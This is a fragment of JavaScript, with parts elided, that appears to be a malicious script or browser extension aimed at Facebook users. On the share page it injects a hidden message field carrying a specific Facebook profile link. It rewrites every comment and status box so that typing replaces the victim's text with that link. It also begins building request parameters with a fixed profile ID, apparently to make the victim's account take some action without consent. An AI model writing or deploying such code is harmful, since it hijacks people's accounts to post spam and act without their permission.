...
if (document.URL.indexOf("sharer.php") >= 0) {
    ...
    document.forms.item(0).innerHTML += "<input type='hidden' autocomplete='off' class='mentionsHidden' name='message' value='http://www.facebook.com/ooyigitoo '>"; 
...
for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
    document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('http://www.facebook.com/ooyigitoo ') < 0 && this.name == 'add_comment_text_text'){this.value = 'http://www.facebook.com/ooyigitoo ';}");
}
document.addEventListener("click", function () {
    ...
    for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
        document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('http://www.facebook.com/ooyigitoo ') < 0 && this.name == 'add_comment_text_text' || this.name == 'xhpc_message_text' && this.value.indexOf('http://www.facebook.com/ooyigitoo ') < 0){this.value = 'http://www.facebook.com/ooyigitoo ';}");
    }
    ...
    var params = "profile_id=100003319743620";
    params += "&location=1";
